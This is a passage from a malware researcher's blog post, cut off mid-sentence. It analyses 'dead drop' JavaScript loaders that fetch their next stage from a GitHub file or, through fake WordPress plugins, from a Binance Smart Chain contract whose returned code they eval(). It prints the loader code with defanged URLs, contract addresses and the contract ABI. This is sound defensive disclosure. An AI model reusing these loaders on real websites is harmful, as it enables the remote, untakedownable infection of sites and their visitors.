---
title: Dead Drop Loaders - Hiding the Next Stage on GitHub and the Binance Smart Chain
url: https://lukeleal.com/research/posts/dead-drop-loaders-github-bsc-etherhiding/
source: Over Security
date: 2026-11-01
fetch_date: 2026-11-02T08:33:26.305299
---

# Dead Drop Loaders - Hiding the Next Stage on GitHub and the Binance Smart Chain

[# Cybersecurity Research 🚀](/research/posts/)

* Menu ▾
* + [Backdoors](https://lukeleal.com/research/tags/backdoor/)
  + [Phishing](https://lukeleal.com/research/tags/phishing/)
  + [Skimmers](https://lukeleal.com/research/tags/skimmer/)
  + [Past Research](https://blog.sucuri.net/author/luke)
  + [PGP Key](https://lukeleal.com/research/pages/pgp/)
  + [RSS](https://lukeleal.com/research/posts/index.xml)

* [Backdoors](https://lukeleal.com/research/tags/backdoor/)
* [Phishing](https://lukeleal.com/research/tags/phishing/)
* [Skimmers](https://lukeleal.com/research/tags/skimmer/)
* + ▾
  + - [Past Research](https://blog.sucuri.net/author/luke)
    - [PGP Key](https://lukeleal.com/research/pages/pgp/)
    - [RSS](https://lukeleal.com/research/posts/index.xml)

# [Dead Drop Loaders - Hiding the Next Stage on GitHub and the Binance Smart Chain](https://lukeleal.com/research/posts/dead-drop-loaders-github-bsc-etherhiding/)

2025-11-21Luke

#[EtherHiding](https://lukeleal.com/research/tags/etherhiding/)
#[BSC](https://lukeleal.com/research/tags/bsc/)
#[smart contract](https://lukeleal.com/research/tags/smart-contract/)
#[GitHub](https://lukeleal.com/research/tags/github/)
#[dropper](https://lukeleal.com/research/tags/dropper/)
#[WordPress](https://lukeleal.com/research/tags/wordpress/)
#[JavaScript](https://lukeleal.com/research/tags/javascript/)
#[website malware](https://lukeleal.com/research/tags/website-malware/)
![Dead Drop Loaders - Hiding the Next Stage on GitHub and the Binance Smart Chain](https://lukeleal.com/research/etherhiding-cover-q90.jpg "Cover Image")

## Table of Contents

* [GitHub as a Dead Drop](#github-as-a-dead-drop)
* [The Blockchain as a Dead Drop (EtherHiding)](#the-blockchain-as-a-dead-drop-etherhiding)
  + [Fake plugins](#fake-plugins)
  + [Reading the contract](#reading-the-contract)
  + [Variants](#variants)
* [What the Contracts Return Today](#what-the-contracts-return-today)
* [Detection & Cleanup](#detection--cleanup)
* [IOCs](#iocs)
* [Samples](#samples)

A traditional JavaScript injection hardcodes the URL of its next stage. When that domain is reported and taken down, every infected site stops working for the attacker.

A **dead drop** fixes this for them. The injection contains only the location of a *second* resource that the attacker controls and can edit, and the real payload URL or code is read from there at runtime. This post covers two samples that do this, from the very simple to the very hard to remove.

## GitHub as a Dead Drop[#](#github-as-a-dead-drop)

This injection is about as small as a loader can be:

```
var url = 'hxxps://raw[.]githubusercontent[.]com/truba77/trubnik/main/from.txt';

fetch(url)
    .then(response => response.text())
    .then(data => {
        // head
        var script = document.createElement('script');
        script.src = data.trim(); // 44
        document.getElementsByTagName('head')[0].appendChild(script);
    })
    .catch(error => {
        console.error('bad go.txt:', error);
    });
```

The file `from.txt` contains just a URL, which gets loaded as a `<script>` on the infected site. The injection itself only talks to `raw[.]githubusercontent[.]com`, a domain that nobody blocks. To switch payload domains across every infected site, the attacker edits a one-line text file.

The error message `bad go.txt` shows that the file has been renamed at least once. The repo name, `truba77/trubnik`, is Russian-looking (*труба* = pipe, *трубник* = pipe fitter).

The weakness is that GitHub *can* remove it. As of this writing, `truba77/trubnik` returns a **404**, and every copy of this injection is now inert.

## The Blockchain as a Dead Drop (EtherHiding)[#](#the-blockchain-as-a-dead-drop-etherhiding)

The technique widely referred to as **EtherHiding** fixes that weakness by storing the dead drop in a **smart contract** on the Binance Smart Chain (BSC). Data stored in a contract can’t be taken down, and reading it is a free, read-only RPC call to a public Binance node.

### Fake plugins[#](#fake-plugins)

The three samples covered here arrive as fake WordPress plugins:

| Plugin Name | Disguise |
| --- | --- |
| `Themes Manager` | “This plugin helps you change themes and edit them.” `Author: WordPress` |
| `MonsterInsights Classic` | Copies the real MonsterInsights plugin header, including its “over 3 million active installs” description |
| `Advanced User Manager` | “Manage user roles and permissions with advanced settings and tools.” Enqueues `aum-script.js` |

Each one hooks into `wp_head` or `wp_enqueue_scripts` to load the JavaScript below on every front-end page.

### Reading the contract[#](#reading-the-contract)

This is the JavaScript from `aum-script.js` with the `atob()` strings decoded:

```
document.addEventListener('DOMContentLoaded', function() {
    const _0x1a21 = "hxxps://cdnjs[.]cloudflare[.]com/ajax/libs/ethers/6.13.1/ethers.umd.min.js";
    ...
    function _0x8f7c() {
        const _0x7a13 = new ethers.JsonRpcProvider("hxxps://bsc-dataseed1[.]binance[.]org/"),
            _0x2b39 = "0xa6165aa33ac710ad5dcd4f4d6379466825476fde",
            _0x6f8b = [ ... ABI ... ],
            _0x5f3a = new ethers.Contract(_0x2b39, _0x6f8b, _0x7a13);
        _0x5f3a.g().then(_0x3bde => {
            const _0x6b22 = atob(_0x3bde);
            const _0x425d = eval(_0x6b22);
            _0x425d instanceof Promise ? _0x425d.then(_0x2ff2 => {
                const _0x2416 = atob(_0x2ff2);
                eval(_0x2416), 'function' == typeof load ? load() : console.error("Function from server is not defined.");
            }) ...
```

1. Load the legitimate **ethers.js** library from cdnjs.
2. Connect to Binance’s public BSC node `bsc-dataseed1[.]binance[.]org`.
3. Call the contract’s `g()` function, base64 decode the string it returns, and `eval()` it.
4. That code returns a Promise whose result is *also* base64 decoded and `eval()`’d, and then a `load()` function from it is called.

The contract’s ABI is tiny. It has a write function `u(string)`, a read function `g()`, and an event `E(string)`:

```
[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
 {"anonymous":false,"inputs":[{"indexed":false,"internalType":"string","name":"","type":"string"}],"name":"E","type":"event"},
 {"inputs":[{"internalType":"string","name":"_c","type":"string"}],"name":"u","outputs":[],"stateMutability":"nonpayable","type":"function"},
 {"inputs":[],"name":"g","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"}]
```

The operator calls `u()` with new code whenever they want to update **every** infected site at once, for the cost of a BSC transaction fee.

### Variants[#](#variants)

The `Themes Manager` plugin is the older version (June 2024). It uses ethers **v5.2** from `cdn[.]ethers[.]io`, a different contract `0xdf20921ea432318dd5906132edbc0c20353f72d6`, and readable function names `get()` / `update()` / `CodeUpdated`.

By January 2025 the same flow had been compacted to `g()` / `u()` / `E` and switched to contract `0xa6165aa33ac710ad5dcd4f4d6379466825476fde`. The `MonsterInsights Classic` version also adds junk code to change its hash:

```
function p6m4() {
    let j2d7 = "kiotoa";
    for (let r8x1 = 0; r8x1 < 10; r8x1++) {
        j2d7 += r8x1;
    }
    return j2d7;
}
...
let l9t4 = [];
for (let m5d8 = 0; m5d8 < 20; m5d8++) {
    l9t4.push(m5d8 * 2);
}
```

The `Advanced User Manager` version also tries to strip other `wp_head` output by calling `remove_all_actions('wp_head')` from inside a callback at `PHP_INT_MAX` priority, and leaves a marker comment in the page:

```
function aum_remove_wp_head_scripts() {
    echo "<!-- Advanced User Manager: Disabled wp_head Scripts -->";
    remove_all_actions('wp_head');
}
add_action('wp_head', 'aum_remove_wp_head_scripts', PHP_INT_MAX);
```

## What the Contracts Return Today[#](#what-the-contracts-return-today)

Because contract storage is public, anyone can check what the dead drop...